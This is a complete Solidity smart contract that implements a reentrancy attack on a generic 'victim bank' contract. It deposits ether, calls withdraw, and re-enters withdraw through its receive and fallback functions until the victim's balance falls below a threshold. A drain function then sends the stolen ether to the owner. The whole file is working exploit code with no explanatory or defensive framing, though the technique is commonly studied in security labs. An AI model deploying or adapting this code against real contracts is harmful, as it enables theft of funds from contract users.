// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IVictimBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    address private immutable owner;
    IVictimBank private immutable victimContract;

    constructor(address _victim) {
        owner = msg.sender;
        victimContract = IVictimBank(_victim);
    }

    function feed() external payable {
        require(msg.sender == owner, "Not owner");
        victimContract.deposit{value: msg.value}();
    }

    function attack() external {
        require(msg.sender == owner, "Not owner");
        victimContract.withdraw();
    }

    function fund() external payable {}

    receive() external payable {
        uint256 targetBalance = address(victimContract).balance;

        if (targetBalance > 1000000000000000 wei) {
            victimContract.withdraw();
        }
    }

    fallback() external payable {
        uint256 targetBalance = address(victimContract).balance;

        if (targetBalance > 1000000000000000 wei) {
            victimContract.withdraw();
        }
    }
    
    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
